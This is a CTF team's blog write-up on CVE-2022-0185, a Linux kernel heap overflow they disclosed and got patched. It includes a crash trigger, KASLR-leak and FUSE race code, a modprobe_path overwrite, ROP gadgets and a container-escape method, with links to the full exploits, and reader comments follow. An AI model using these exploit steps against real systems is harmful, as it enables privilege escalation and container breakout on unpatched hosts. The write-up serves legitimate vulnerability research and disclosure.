### CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Google's KCTF Containers

Recently, several friends on my CTF team [Crusaders of Rust](https://cor.team)
and I found a Linux kernel heap overflow 0-day. We found the bug
through fuzzing with syzkaller and we quickly developed it into an
Ubuntu LPE exploit. Afterwards, we rewrote it to escape and root
Google’s hardened Kubernetes CTF infrastructure. This bug affects all
kernel versions since 5.1 (5.16 is in progress currently), and has been
assigned CVE-2022-0185. We have already disclosed this to the Linux
security and distro mailing list, and the bug has been patched as of
this article’s release. Before I continue, I would like to give several
acknowledgements for those who worked with me.

A huge shoutout must go to [clubby789](https://clubby789.me), [Day91](https://day91.me), and [ryaagard](https://twitter.com/ryaagard).
Thanks must go to all of them (especially ryaagard for porting the exploit to Ubuntu 20.04), for working with me on the exploit for
several days straight. As an extra fun tidbit of information, Day is
only 15 at the time of writing this exploit… I can’t wait to see what he
will do in a few years!

Further thanks must go to [chop0](https://xz.az) for finding this bug and setting up our private fuzzing infrastructure, and [ginkoid](https://github.com/ginkoid) for giving us ideas for container escapes and setting up our testing infrastructure.

One last thing to mention is that this bounty submission was actually a bug collision. During the disclosure process, we found out that [n0psledbyte](https://twitter.com/n0psledbyte) from the Singaporean VR firm StarLabs actually found the same bug earlier. Since we were the first to properly report and disclose it, Google was still nice enough to grant us a sizeable bounty - thanks to [sirdarckcat](https://twitter.com/sirdarckcat?lang=en) for helping us out with the bug collision situation.

Beginning 2022, our teamates were resolved to find a 0 day in 2022.
We weren’t really sure how exactly to get started, but since our team
had a high degree of familiarity with Linux kernel exploits, we decided
to just purchase some dedicated servers and run Google’s [syzkaller](https://github.com/google/syzkaller) fuzzer. On January 6th at 22:30 PST, chop0 hit the following report on a KASAN failure in `legacy_parse_param`: `slab-out-of-bounds Write in legacy_parse_param`. It seems like [syzbot](https://groups.google.com/g/syzkaller-android-bugs/c/hWixpJ22kc8/m/-fEuuHsxEAAJ)
found this issue just 6 days earlier when fuzzing Android, but the
issue was left unhandled and we naively thought no one else took notice.

The following was the crash log:

Fiddling around a bit with the C repro, we found the following snippet could trigger a crash reliably:

#define \_GNU\_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#ifndef \_\_NR\_fsconfig
#define \_\_NR\_fsconfig 431
#endif
#ifndef \_\_NR\_fsopen
#define \_\_NR\_fsopen 430
#endif
#define FSCONFIG\_SET\_STRING 1
#define fsopen(name, flags) syscall(\_\_NR\_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(\_\_NR\_fsconfig, fd, cmd, key, value, aux)
int main(void)
{
char\* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
int fd = 0;
fd = fsopen("9p", 0);
if (fd < 0) {
puts("Opening");
exit(-1);
}
for (int i = 0; i < 5000; i++) {
fsconfig(fd, FSCONFIG\_SET\_STRING, "\x00", val, 0);
}
return 0;
}

Now, what exactly is causing the overflow? First of all, what is this `fsconfig` syscall? According to the [patch](https://patchwork.kernel.org/project/linux-fsdevel/patch/153313723557.13253.9055982745313603422.stgit%40warthog.procyon.org.uk/) that brought it in:

Add a syscall for configuring a filesystem creation context and triggering
actions upon it, to be used in conjunction with `fsopen`, `fspick` and `fsmount`.

For arguments, we need to pass in a file descriptor, along with the
cmd `FSCONFIG_SET_STRING` and 2 strings for key and value to reach the
region of the crash. Per the patch notes for using `FSCONFIG_SET_STRING`,
the value must point to a null terminated string, and the final argument
(the auxiliary value) must be 0. Let’s go through the path of the stack
trace, starting at [`vfs_fsconfig_locked`](https://elixir.bootlin.com/linux/v5.14.21/source/fs/fsopen.c#L216). Nothing really pertinent to the bug is here, besides knowing that the default case in its switch statement leads to [`vs_parse_fs_param`](https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L127). Note how it calls the `parse_param` function pointer from the `ops` field of the fs\_context pointer. As defined by the [`legacy_fs_context_ops`](https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L637) structure, this function pointer is what points to `legacy_parse_param`.

What exactly determines if something is “legacy?” When allocating a filesystem context structure in [`alloc_fs_context`](https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L288), the following happens:

 /\* TODO: Make all filesystems support this unconditionally \*/
init\_fs\_context = fc->fs\_type->init\_fs\_context;
if (!init\_fs\_context)
init\_fs\_context = legacy\_init\_fs\_context;

`fs_type` is of the type `struct file_system_type`. Looking at references to the `file_system_type` struct, we see a whole [list](https://elixir.bootlin.com/linux/v5.14.21/C/ident/file_system_type) from different files that handle different file\_systems. The one we abused in our exploit was [`ext4`](https://elixir.bootlin.com/linux/v5.14.21/source/fs/ext4/super.c#L6713). Our original fuzzing crash happened on the [Plan 9 filesystem](https://elixir.bootlin.com/linux/v5.14.21/source/fs/9p/vfs_super.c#L357). It seems like in both of these (and a ton of other file systems) don’t have the `init_fs_context` field set so they all default to legacy and can go down the path of `legacy_parse_param`.

Let’s take a look at the offending function [`legacy_parse_param`](https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L525):

static int legacy\_parse\_param(struct fs\_context \*fc, struct fs\_parameter \*param)
{
struct legacy\_fs\_context \*ctx = fc->fs\_private;
unsigned int size = ctx->data\_size;
size\_t len = 0;
int ret;
ret = vfs\_parse\_fs\_param\_source(fc, param);
if (ret != -ENOPARAM)
return ret;
if (ctx->param\_type == LEGACY\_FS\_MONOLITHIC\_PARAMS)
return invalf(fc, "VFS: Legacy: Can't mix monolithic and individual options");
switch (param->type) {
case fs\_value\_is\_string:
len = 1 + param->size;
fallthrough;
case fs\_value\_is\_flag:
len += strlen(param->key);
break;
default:
return invalf(fc, "VFS: Legacy: Parameter type for '%s' not supported",
param->key);
}
if (len > PAGE\_SIZE - 2 - size)
return invalf(fc, "VFS: Legacy: Cumulative options too large");
if (strchr(param->key, ',') ||
(param->type == fs\_value\_is\_string &&
memchr(param->string, ',', param->size)))
return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
param->key);
if (!ctx->legacy\_data) {
ctx->legacy\_data = kmalloc(PAGE\_SIZE, GFP\_KERNEL);
if (!ctx->legacy\_data)
return -ENOMEM;
}
ctx->legacy\_data[size++] = ',';
len = strlen(param->key);
memcpy(ctx->legacy\_data + size, param->key, len);
size += len;
if (param->type == fs\_value\_is\_string) {
ctx->legacy\_data[size++] = '=';
memcpy(ctx->legacy\_data + size, param->string, param->size);
size += param->size;
}
ctx->legacy\_data[size] = '\0';
ctx->data\_size = size;
ctx->param\_type = LEGACY\_FS\_INDIVIDUAL\_PARAMS;
return 0;
}

Given that your value points to a string, it will factor in both the length of the value string and the key string. If this is the first time hitting this region (basically if legacy data hasn't been allocated yet), a 4k chunk will be allocated for it. It sets a ",", copies over the key, sets an "=" sign, and then copies over the value of your data before null termination. Well, how can we overflow? You can see the bound check to prevent overflows:

 if (len > PAGE\_SIZE - 2 - size)
return invalf(fc, "VFS: Legacy: Cumulative options too large");

While this
bound check will suffice for most cases, if your size is 4095 bytes or
greater, an integer underflow will occur as `size` in this
case is an unsigned int. Hence, trigger the underflow there and you will
get infinite heap overflow.

This bug popped up since [5.1-rc1](https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05). It’s important to note that you need the `CAP_SYS_ADMIN` capability to trigger it, but the permission only [needs to be granted in the CURRENT NAMESPACE](https://elixir.bootlin.com/linux/v5.14.21/source/fs/fsopen.c#L122). Most unprivileged users can just `unshare(CLONE_NEWNS|CLONE_NEWUSER)` (equivalent of the command `unshare -Urm`)
to enter a namespace with the `CAP_SYS_ADMIN` permission, and abuse the
bug from there; this is what makes this such a dangerous vulnerability.

Fixing this is a simple patch. Here’s the fix clubby789 developed and what we sent to the Linux kernel project.

Ok, but who cares about the patch. Let’s talk about exploitation now :)

Our original POC’s goal was to achieve LPE on Ubuntu, preferably
20.04 which is probably the most popular? version in use currently. The
exact kernel we targeted was of version 5.11.0-44. As with most distro
kernels, there are a ton of hardening options compiled in, like slab
randomization, slab hardening, usercopy hardening, etc. I’ve discussed a
lot about some common kernel hardening measures in previous kernel
exploitation posts. And of course since these are modern systems, SMAP,
SMEP, KASLR, and KPTI will be turned on. Being distro images, there are
also some options that are required for general use that will work to
our advantage for exploitation, such as `CONFIG_CHECKPOINT_RESTORE`,
`CONFIG_USER_NS`, `CONFIG_FUSE`, `CONFIG_SYSVIPC`, and `CONFIG_USERFAULTFD`.

What primitives do we have with this bug? Only a
heap overflow. I wonder if there’s anything I can do with this to
escalate privileges… heap overflow in a 4k slab. This past summer, [D3v17](https://syst3mfailure.io/)
and I teamed up and wrote a series of articles and challenges focused
on abusing the `msg_msg` structures for OOB read, arb read, and arb write;
please take a read at these before I continue as I will be writing with
the assumption that the reader has this prerequisite knowledge: [part 1](https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html), [part 2](https://syst3mfailure.io/wall-of-perdition).
Our first challenge and article specifically dealt with a 0x30 byte
UAF at the very beginning of the `msg_msg` structure in the 4k slab, so a
heap overflow in the 4k slab would fit this scenario perfectly. With all
but one exception, the exact same strategy from our Fire of Salvation
kernel challenge can be repeated here.

Before I continue, I would like to make a note about exploit
stability. Interestingly enough, it seems that newer Linux kernel
exploit mitigations actually contributed to the stability of the exploit
we had on Ubuntu. As you will see later on in our exploit, we never did
a lot of spraying besides some initial sprays to clean up the slabs and
forcing cpu affinity on one core since each core has their own
freelist. Wouldn’t it make sense for slab randomization combined
with a string based heap overflow to cause many crashes for systems with
SLUB freelist allocators?

Well, yes if the freelist pointer was at the beginning of each chunk;
our attempts at exploiting these versions of the kernel required a lot
more work related to spraying and never achieved a success rate better
than 50% (although due to instability issues on the Google Kubernetes’s
infrastructure, I had to redevelop the spray even for newer kernel
versions that should alleviate this corruption problem). Since
5.7, Linux kernel developers decided to [move the freelist pointer to the middle](https://lore.kernel.org/linux-mm/202003051624.AAAC9AECC%40keescook/t/)
to avoid overflows corrupting the kernel heap state.
This means that as long as my overflow doesn’t corrupt some very
important object, I can keep overflowing the first 0x30 bytes (which is
all that matters for abusing `msg_msg`) and never corrupt the heap state
in the 4k pages - this makes it pretty easy to try to leak memory or
perform an arbitrary write on repeat as we can get a fresh legacy data
allocation with every new fd we create with `fsopen`. Thanks mitigations!

To obtain a KASLR leak on general Linux distributions (again, if
anything here sounds confusing, refer to the articles from D3v17 and
me), we just need our legacy data chunk to be allocated right on top of a 4k msg\_msg chunk chained with a kmalloc-32 `msg_msgseg` chunk. We can use our overflow to adjust the `msg_msg` size parameter and make it
larger, and then use `MSG_COPY` to achieve an OOB leak. If we spray many
`seq_operations` structure using the classic `open(“/proc/self/stat”,
O_RDONLY)` trick, we will have a high likelihood of an OOB read
leaking us the pointers within this structure, which will let us rebase
the kernel and bypass KASLR.

Note that since we do not have heap leaks and that usercopy hardening
does heap object bounds checking, we have to rely on `MSG_COPY`, which
doesn’t unlink the `msg_msg` from its `msg_queue` (which would then utilize
the linked list pointers in the first 0x10 bytes of `msg_msg` objects) and
uses memcpy to transfer data to a new `msg_msg` structure before
usercopying back.

This following snippet of code should accomplish a KASLR leak:

uint64\_t do\_leak ()
{
uint64\_t kbase = 0;
char pat[0x1000] = {0};
char buffer[0x2000] = {0}, recieved[0x2000] = {0};
int targets[0x10] = {0};
msg \*message = (msg \*)buffer;
int size = 0x1018;
// spray msg\_msg
for (int i = 0; i < 8; i++)
{
memset(buffer, 0x41+i, sizeof(buffer));
targets[i] = make\_queue(IPC\_PRIVATE, 0666 | IPC\_CREAT);
send\_msg(targets[i], message, size - 0x30, 0);
}
memset(pat, 0x42, sizeof(pat));
pat[sizeof(pat)-1] = '\x00';
puts("[\*] Opening ext4 filesystem");
fd = fsopen("ext4", 0);
if (fd < 0)
{
puts("fsopen: Remember to unshare");
exit(-1);
}
strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
for (int i = 0; i < 117; i++)
{
fsconfig(fd, FSCONFIG\_SET\_STRING, "\x00", pat, 0);
}
// overflow, hopefully causes an OOB read on a potential msg\_msg object below
puts("[\*] Overflowing...");
pat[21] = '\x00';
char evil[] = "\x60\x10";
fsconfig(fd, FSCONFIG\_SET\_STRING, "\x00", pat, 0);
// spray more msg\_msg
for (int i = 8; i < 0x10; i++)
{
memset(buffer, 0x41+i, sizeof(buffer));
targets[i] = make\_queue(IPC\_PRIVATE, 0666 | IPC\_CREAT);
send\_msg(targets[i], message, size - 0x30, 0);
}
fsconfig(fd, FSCONFIG\_SET\_STRING, "\x00", evil, 0);
puts("[\*] Done heap overflow");
puts("[\*] Spraying kmalloc-32");
for (int i = 0; i < 100; i++)
{
open("/proc/self/stat", O\_RDONLY);
}
size = 0x1060;
puts("[\*] Attempting to recieve corrupted size and leak data");
// go through all targets qids and check if we hopefully get a leak
for (int j = 0; j < 0x10; j++)
{
get\_msg(targets[j], recieved, size, 0, IPC\_NOWAIT | MSG\_COPY | MSG\_NOERROR);
kbase = do\_check\_leak(recieved);
if (kbase)
{
close(fd);
return kbase;
}
}
puts("[X] No leaks, trying again");
return 0;
}

Now, we can perform the same arbitrary write technique D3v17 and I
created. When you trigger the allocation of `msg_msg` and make a requested
size require larger than 4096, we need to hang the usercopy when it
copies to the first `msg_msg` chunk but before it traverses and usercopies
to the `msg_msgseg` chunk. Previously, we did it with userfaultfd, but since
unprivileged userfaultfd is disabled by default since 5.11, how can we
reliably race this?

I went through this [slideshow](https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf) and the [FUSE technique](https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606.md)
caught my attention. The gist of it is that in Linux, users can
communicate with /dev/fuse to create their own custom filesystem in
userspace. You can create your own files in this userspace filesystem,
map them in memory with mmap, have usercopy reach them when copying, and
have your custom filesystem read handlers just hang or do anything else
you want. Here is our custom FUSE filesystem’s handlers:

int evil\_read(const char \*path, char \*buf, size\_t size, off\_t offset,
struct fuse\_file\_info \*fi)
{
// change to modprobe\_path
char signal;
char evil\_buffer[0x1000];
memset(evil\_buffer, 0x43, sizeof(evil\_buffer));
char \*evil = modprobe\_win;
memcpy((void \*)(evil\_buffer + 0x1000-0x30), evil, sizeof(evil));
size\_t len = 0x1000;
if (offset >= len)
return size;
if (offset + size > len)
size = len - offset;
memcpy(buf, evil\_buffer + offset, size);
// sync with the arb write thread
read(fuse\_pipes[0], &signal, 1);
return size;
}

There were two difficulties however with this FUSE race technique.
Normally, as a normal unprivileged user, you need access to a suid
/bin/fusermount binary. Performing the unshare which triggered our own
user namespace’s creation would allow us to skip that requirement.
Another issue is that a user would require libfuse libraries for libfuse
functions to work, as libfuse is notoriously difficult to statically
link, as seen [here](https://github.com/libfuse/libfuse/issues/383) because it specifically relies on `dl_open` for some extra features. We addressed this by removing all the references to `dl_open`
and rebuilding the library. Static compilation then worked nicely and
this technique would work on any system with `CONFIG_FUSE` enabled
regardless of libfuse or fusermount availability.

One last thing with this exploit… where do we target? For the exploit
simplicity’s sake, we only targeted `modprobe_path` (the classic
`modprobe_path` kernel pwning trick) for our Ubuntu LPE exploits. We
overwrote it with the path to a script that made /bin/bash suid, and
this script will trigger with root privileges whenever anyone attempts
to run a binary with an invalid header. Here is our Ubuntu LPE exploit
so far:

// msg\_msg arb write trick by hanging before `msg_msgseg` on usercopy
// use FUSE to time the race
void do\_win()
{
int size = 0x1000;
char buffer[0x2000] = {0};
char pat[0x1000] = {0};
msg\* message = (msg\*)buffer;
memset(buffer, 0x44, sizeof(buffer));

uint64\_t race\_page = 0x1338000;

rooter->mtype = 1;
size = 0x1010;
int target = make\_queue(IPC\_PRIVATE, 0666 | IPC\_CREAT);
send\_msg(target, message, size - 0x30, 0);
puts("[\*] Opening ext4 filesystem");
fd = fsopen("ext4", 0);
if (fd < 0)
{
puts("Opening");
exit(-1);
}
puts("[\*] Overflowing...");
strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
for (int i = 0; i < 117; i++)
{
fsconfig(fd, FSCONFIG\_SET\_STRING, "\x00", pat, 0);
}
puts("[\*] Prepaing fault handlers via FUSE");
int evil\_fd = open("evil/evil", O\_RDWR);
if (evil\_fd < 0)
{
perror("evil fd failed");
exit(-1);
}
if ((mmap((void \*)0x1338000, 0x1000, PROT\_READ | PROT\_WRITE, MAP\_SHARED | MAP\_FIXED, evil\_fd, 0)) != (void \*)0x1338000)
{

exit(-1);
}

int race = pthread\_create(&thread, NULL, arb\_write, NULL);
if(race != 0)
{
perror("can't setup threads for race");
}
send\_msg(target, rooter, size - 0x30, 0);
pthread\_join(thread, NULL);
munmap((void \*)0x1337000, 0x1000);

}

You can find the full link to our exploit here: <https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_fuse.c>; it can be
easily adjusted for any kernel versions above 5.7, and the spray will
need to be reworked for even older versions. Now with /bin/bash as suid,
the exploit will finish. As any low privileged user with access to
bash, one can just run it with the -p argument to achieve root
privileges! All in all, a really simple (and reliable) exploit using
techniques discovered in the CTF world.

Having an Ubuntu LPE is great and all, but what we really wanted to
try was the Google kCTF VRP program for their bounty. The money would be
great, and ~~an exploit in a hardened environment will be quite useful during CTFs.~~
They offered two challenges: kctf and fullchain. kctf is where you root
the container to read the container’s root flag, and fullchain is where
you root the container, escape to host, and then read the root flag of
another container. Fullchain is the goal.

There were many issues early on. For one, the /dev folder was
barebones, so fuse and other favorite kernel exploit structures like
`tty_struct` were unavailable. Userfaultfd was of course be
disabled, and the kernel heap in the 4k slab seemed to have had many
structures as well (the heap behaved more actively in this container
environment in general for the slabs I targeted) - this required better
spraying strategies to help with stability.

One more important issue is in regards to the `GFP_KERNEL_ACCOUNT`
flag. Accounting flag is usually reserved for objects with data from
userland - famous structures like `msg_msg` are all allocated with them.
Before 5.9, the kernel placed accounted objects in separate slabs, but
this only takes affect with the `CONFIG_MEMCG_KMEM` compilation option…
another case of an upgrade making exploits easier.

How does the above issue affect our exploit? Shouldn’t the legacy
data allocations also have the accounting flags based on its purpose in
documentation? Well, it should, but it seems like kernel developers
forgot about this until a [recent commit for 5.16](https://github.com/torvalds/linux/commit/bb902cb47cf93b33cd92b3b7a4019330a03ef57f#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05).
This means that `msg_msg` would not be able to be abused on the kctf
infrastructure Google hosted, which was on 5.4, and we would have to
look for a new structure, either through a lot of source reading or
CodeQL. We were lucky as it was around this time that an update for kctf
was almost complete where Kubernetes running on a 5.10 kernel would be
available (hence the creation of kctf.vrp2.ctfcompetition.com), so we
just ended up targeting this one to save time.

Note that Starlabs managed to get it on the older kctf instance. I
asked n0psledbyte afterwards about their approach - they managed to
abuse `msg_msg` too by performing a cross cache overflow, an interesting
concept I’ve never really thought about. grsecurity has an [article](https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game) related to this strategy and I am curious how much spraying is required to achieve an acceptable reliability rate.

With limited abilities to control a race, we can’t exactly use
`msg_msg` for arbitrary write. Our thoughts at this point were to either
rely on the unlink primitive or arbitrary free primitive that `msg_msg`
provides. Our end goal was to replace the [pipe\_buffer](https://elixir.bootlin.com/linux/v5.7/source/include/linux/pipe_fs_i.h#L21)
pointer to a function table with a pointer to some other arbitrary
msg\_msg chunk, for us to gain ROP control. Thanks to articles from [Andy Nguyen](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html) and [bsauce](https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/) for providing me with the `pipe_buffer` idea!

Before I discuss unlink or the arbitrary free primitive, I need to
first discuss the heap spraying technique I used here to help with
slab randomization on top of a busier heap, and the mechanism to which I
achieved a heap leak.

A chat with D3v17 and this [article](https://github.com/PaoloMonti42/salt/blob/master/docs/0x00_SLUB_refresher.md#slub)
were pretty helpful for planning out the spray. As mentioned
previously, the first thing I did was to force cpu affinity on one core,
as each cpu has its own freelists. Some other tricks I did (I’m not
sure if they actually do help as it might just be placebo, but when
testing, they definitely increased exploit reliability) were the
following - a lot of the spray related constants I used in the final
exploit was specifically targeted towards the Kubernetes infrastructure:

1. Pre-allocate a ton of chunks beforehand using `msg_msg` sprays. Then,
   after each stage of the exploit, or when trying to repeat a stage, I
   would trigger some of them to be freed. Hopefully, this covers up some
   of the corruption and prevents crashes on future allocations. All of
   these saved chunks would be dumped as well before triggering a root
   shell as a final “cleanup.”
2. Before performing overflows into `msg_msg` objects from `fsconfig`, I
   would allocate anywhere from 4 to 7 `msg_msg` objects (as there are only 8
   objects in a kmalloc-4k slab). I would then trigger a `MSG_COPY` on one
   of them, which would force an allocation and free in the same slab in the copy process. Hopefully, this would create a hole in the
   slab, and my next allocation of the legacy data region will go right on
   top of a `msg_msg` object.

With this spray mechanism, I managed to easily achieve kernel leaks
and heap leaks. For my heap leaks, I used that fact that each `msg_queue`
connects their `msg_msg` objects together in a doubly linked list. If you
allocate a kmalloc-64 `msg_msg` object between a kmalloc-512 object and a
kmalloc-1k object in one queue, and allocate a kmalloc-4k `msg_msg`
chained to a kmalloc-64 `msg_msgseg` object in another queue, you can abuse
OOB read to leak out the kmalloc-512 and kmalloc-1k object addresses.
Using kmalloc-512 isn’t necessarily required, it’s just what I chose and
I didn’t bother changing it afterwards. The diagram below should help
clarify this stage.

Heap Setup:

You can also figure out which `msg_queue` those leaked addresses belonged
to based on the contents in msg\_msg data, so you can seletively free
them and rely on LIFO to place objects there in advance. I replaced the
kmalloc-1k one with a `pipe_buffer` object while kmalloc-512 already had
stack pivot gadgets ready.

}

With this information, we can attempt to gain control of the `pipe_buffer` ops table pointer.

As I mentioned earlier, my first approach was to perform an unlink attack. In `do_msgrcv`, the [unlink operation](https://elixir.bootlin.com/linux/v5.7/source/ipc/msg.c#L1153)
occurs when `MSG_COPY` is not specified. When this occurs, the big
picture of what occurs is `victim->prev->next = victim->next` and
`victim->next->prev = victim->prev`. If you set up
`victim->prev` to the location of the ops table pointer, and set
`victim->next` to an address in your kmalloc-512 `msg_msg` data buffer,
you should be able to change the ops table pointer to point to your
malicious msg buffer. Basically a classic unlink attack as the diagram
below shows:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEicQfNWiB9bQozs2PBDxpXGNps2qnvA69q2PaJ-AfA7scOxGRpSKjQn28AtIGsR-yqjpqAA9eSyWezl79JvMYkyEjNe9iuQNKToKN4gcU0VxBGkRdRP7MZ4le4tOQxhfO8BzIaIMATHkLEH-5A_ZVHjVvGNTr8e7x5B-bT_XLezIgX7GF4Hz8oIZtL7Uw=w640-h380)](https://blogger.googleusercontent.com/img/a/AVvXsEicQfNWiB9bQozs2PBDxpXGNps2qnvA69q2PaJ-AfA7scOxGRpSKjQn28AtIGsR-yqjpqAA9eSyWezl79JvMYkyEjNe9iuQNKToKN4gcU0VxBGkRdRP7MZ4le4tOQxhfO8BzIaIMATHkLEH-5A_ZVHjVvGNTr8e7x5B-bT_XLezIgX7GF4Hz8oIZtL7Uw%3Ds1034)

Unfortunately, `CONFIG_DEBUG_LIST` was enabled. In this case, linked list unlink performs a validity check with this [function](https://elixir.bootlin.com/linux/v5.7/source/lib/list_debug.c#L38).
Upon failure, it just doesn’t unlink (but the frees still happen and
the original pointers get set to the kernel POISON constants).

bool \_\_list\_del\_entry\_valid(struct list\_head \*entry)
{
struct list\_head \*prev, \*next;
prev = entry->prev;
next = entry->next;
if (CHECK\_DATA\_CORRUPTION(next == LIST\_POISON1,
"list\_del corruption, %px->next is LIST\_POISON1 (%px)\n",
entry, LIST\_POISON1) ||
CHECK\_DATA\_CORRUPTION(prev == LIST\_POISON2,
"list\_del corruption, %px->prev is LIST\_POISON2 (%px)\n",
entry, LIST\_POISON2) ||
CHECK\_DATA\_CORRUPTION(prev->next != entry,
"list\_del corruption. prev->next should be %px, but was %px\n",
entry, prev->next) ||
CHECK\_DATA\_CORRUPTION(next->prev != entry,
"list\_del corruption. next->prev should be %px, but was %px\n",
entry, next->prev))
return false;
return true;
}

Glibc heap pwners are all well too familiar with this type of check…

Since we have heap leaks, we can overwrite the linked lists so they
can still dereference upon unlink (even if unlink fails) and then
overwrite the `next` pointers and `security` pointers to build an arbitrary
free primitive when chained with `do_msgrcv`. As the payload must also be
valid strings, we can only do unaligned frees given the slab heap leaks
we have. My plan is to just ignore whatever we freed in kmalloc-512 (so I
will write a misaligned address for the `security` pointer), and free the
address at our kmalloc-1k chunk at an offset of -0x20. Now, if we
manage to allocate a 1k sized `msg_msg` over this last freed spot, we can
safely copy in controlled userdata to overwrite the ops pointer to point
to an address holding our stack pivot gadget, while also not triggering
hardened usercopy bounds checks.

The following diagrams should clarify the above strategy.

The corrupted 4k `msg_msg` should create this heap scenario:

 Then, freeing the 4k `msg_msg` and spraying some 1k `msg_msg` to hopefully overlap with the target `pipe_buffer`:[![](https://blogger.googleusercontent.com/img/a/AVvXsEjnLUr8XN9yLDh8kj0Pc_7H2Oee3c62if_y33BCgkD9fESjzQuVaT8HpEEPhEjh_t7TL5_KB8KL4fCpxYJp_8DBd5tudksGAs_xb6MGehd3Y99AP5HTHerLOqRAyZXBvOxqJXFiCIbYoNFp2SF9GxMkJRQrwgv3bHQCGtMtwFQFUidIyvGR3jj0qzpYQw=w640-h536)](https://blogger.googleusercontent.com/img/a/AVvXsEjnLUr8XN9yLDh8kj0Pc_7H2Oee3c62if_y33BCgkD9fESjzQuVaT8HpEEPhEjh_t7TL5_KB8KL4fCpxYJp_8DBd5tudksGAs_xb6MGehd3Y99AP5HTHerLOqRAyZXBvOxqJXFiCIbYoNFp2SF9GxMkJRQrwgv3bHQCGtMtwFQFUidIyvGR3jj0qzpYQw%3Ds920)

Closing the target pipefd with close should trigger one of your stack
pivots due to the overwritten ops table pointer (the release function
to be specific). At this point, we noticed that none of the registers
actually pointed to somewhere in kmalloc-512, but all the known
addresses registers like rax pointed to were at the start of the
`pipe_buffer` chunk. This means that the 1k `msg_msg` chunk we used to
overwrite the `pipe_buffer` will also need to contain the ROP chain, and
our stack pivot needs to replace rsp with rax.

Scanning for nice gadgets, I came to use the following:

stack pivot: `mov rsp, rax ; pop rbp ; ret;`

set rdi: `pop rdi ; ret ;`

set rsi: `pop rsi ; ret ;`

set rdi from rax: `test esi, esi ; cmovne rdi, rax ; mov rax, qword [rdi] ; pop rbp ; ret ;`

The goal of our ROP chain was ultimately to become root in the root
namespace. I borrowed Andy Nguyen’s ROP chain strategy to
`commit_cred(prepare_kernel_cred(NULL))` and
`switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)` to achieve
that goal. After performing those operations, I relied on the kpti
trampoline from `swapgs_and_return_to_userspace` to successfully and
gracefully return back to userland. All that we need to fully escape now
is to do the classic [`setns` tricks](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation) in container breakouts.

The following snippet of code shows what I did to achieve privilege escalation and containerization escape:

{
char buf[200] = {0};
for (int i = 0; i < 4194304; i++)

To find the other container’s flag, I just bruteforced
/proc/pid/root/flag/flag as the container’s pid will map to some other
pid accessible from the root pid namespace. You can also just work with a
root shell, but this is just more efficient for getting the flag.
Google’s Kubernetes CTF infrastructure compromised! You can find the
link to our final exploit here: <https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_kctf.c>.

All in all this was a really cool experience, finding a 0 day for the
first time on a major project and exploiting it. I’d like to thank all
the teammates I worked with above for our collaborative effort. I would
also like to thank the security teams from both distros and Linux for
being super responsive upon our disclosure, and Google for the generous
reward. Feel free to ask me any questions about this writeup, or point
out anything that is explained erroneously! Let’s see what other bugs my
team and I can find this year, and hopefully we don’t hit another bug
collision again.

   I'm not a programmer myself, so don't get my words too close to the heart. But why does Crusader of Rust write PoC-code in C, not Rust?

   Mind-numbingly impressive! One question: why was the vulnerability bounty reduced to $31K from the $50.3K, given how this was a true 0day, and Google itself states:

   "Our base rewards for each publicly patched vulnerability is 31,337 USD (at most one exploit per vulnerability), but the reward can go up to 50,337 USD in two cases:
   - If the vulnerability was otherwise unpatched in the Kernel (0day)
   - If the exploit uses a new attack or technique, as determined by Google"

   PS: Your Rope2 write-up is still the gold standard among bin-exp writeups. That thing is out of this world!

     Thanks for reading the writeup! The bounty wasn't $50k since there was a bug collision (which I mentioned in the post) - thankfully, we were the first to properly disclose it, so Google still rewarded us with a generous bounty.

   Nice job!
   Btw, I wonder how you found the bug. Did you run syzkaller directly and found it? Did you make any customization to syzkaller? If possible, can you share what customization you did? Thanks!
   I'm determined to find an exploitable Linux kernel 0day this year as well. But so far, it didn't find anything exploitable yet.

     Surprisingly, the default configuration for syzkaller actually found this! It was interesting to see how both of our fuzzer and syzbot's found this bug a few days apart in 2022 while the bug existed since 2019 - perhaps some recent change in either the kernel or syzkaller made it easier to trigger.

     Great!
     Do you mean (default configuration), no enabled\_syscalls in syzkaller.cfg ?

     Yes, our fuzzer which caught this was setup as just the default configuration (where the only changes were adjustments for resource consumption).

   Great writeup!!
   There's a problem when I try to reproduce the exploit for kctf. Is it okay for linux kernel when you kfree an address which is not alloced by kmalloc (in the writeup the address is kmalloc-1k - 0x20), will this kind of action cause kernel panic?

   I test my the exploit on my local kctf enviroment, and always get crash when try to free the security pointer:
   [ 134.915194] Call Trace:
   [ 134.915410] kfree+0x2a9/0x340

     Misaligned frees should be allowed, as I did rely on that behavior in the exploit. I have seen that crash happen several times when debugging, but it didn't happen often enough for me to investigate.
